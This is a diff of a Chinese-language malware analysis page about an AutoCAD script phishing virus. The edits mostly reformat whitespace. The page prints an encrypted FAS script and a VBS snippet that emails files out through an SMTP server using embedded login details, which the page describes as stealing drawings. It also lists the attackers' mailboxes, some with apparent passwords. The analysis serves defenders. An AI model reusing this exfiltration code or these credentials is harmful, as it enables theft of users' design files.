@@ -1,4 +1,4 @@
-# CAD病毒
+# CAD 病毒
 
 <DocsAD/>
 
@@ -6,16 +6,16 @@
 
 ## 简单分析
 
-### CAD脚本钓鱼[直播讲解](https://forum.deelmind.com/)
+### CAD 脚本钓鱼[直播讲解](https://forum.deelmind.com/)
 
-1. 解密FAS[脚本](https://deelmind.org/app/1231.html)
+1. 解密 FAS[脚本](https://deelmind.org/app/1231.html)
 
 ```fas
 
  FAS4-FILE ; Do not change it!
 697
-42 $ 	) \  	( \  	' Q&  
-% ( ) 5$ # gO   ) 2# 5" ! 5  2 5 g   ! % 5 % W    ) 2# 5 5" ) W?) 5  2 5 g   ) % 5 % W    % 5   	 \  	 \  	 Q&  
+42 $ 	) \  	( \  	' Q& 
+% ( ) 5$ # gO   ) 2# 5" ! 5  2 5 g   ! % 5 % W    ) 2# 5 5" ) W?) 5  2 5 g   ) % 5 % W    % 5   	 \  	 \  	 Q& 
  j    j     5 j   g?  2 	 5 3€枠 5 5   	   5   5 
   5   
  5     5
@@ -208,7 +208,7 @@ w1.鰺!糇寉妟:]GKPbTS?烛)??rWW3?4ㄢ庮?[t\B?(?S)R?�
 ;$;A5/13/06
 ```
 
-### 生成VBS发送邮件，盗取图纸
+### 生成 VBS 发送邮件，盗取图纸
 
 ```vbs
 ON ERROR RESUME NEXT
@@ -221,7 +221,7 @@ Email.Textbody = "世界上能画出来的人不超过100个,画出来的人智�
 Email.AddAttachment "C:\Windows\System32\趣味机械制图.rar"
 With Email.Configuration.Fields
 .Item(NameSpace&"sendusing") = 2
-.Item(NameSpace&"smtpserver") = "smtp.163.com" 
+.Item(NameSpace&"smtpserver") = "smtp.163.com"
 .Item(NameSpace&"smtpserverport") = 25
 .Item(NameSpace&"smtpauthenticate") = 1
 .Item(NameSpace&"sendusername") = "cn1251692"
@@ -243,7 +243,7 @@ BJ3645254@163.com
 BJ365644@163.com
 lp8946375@163.com
 cn1223543@163.com
-cn1285689@163.com  
+cn1285689@163.com
 cn1266959@163.com
 cn1252522@163.com
 cn1228121@163.com
@@ -260,10 +260,10 @@ cn1281126@163.com
 cn1261992@163.com
 cn1251692@163.com
 autocad-Line@qq.com
-autocad-CirCle@qq.com	
-1410420273@qq.com 
+autocad-CirCle@qq.com
+1410420273@qq.com
 autocad-server@qq.com
-autocad-3DARRAY@qq.com	
+autocad-3DARRAY@qq.com
 1504477971@qq.com
 1281578303@qq.com	112181784
 1340695238@qq.com	112181784
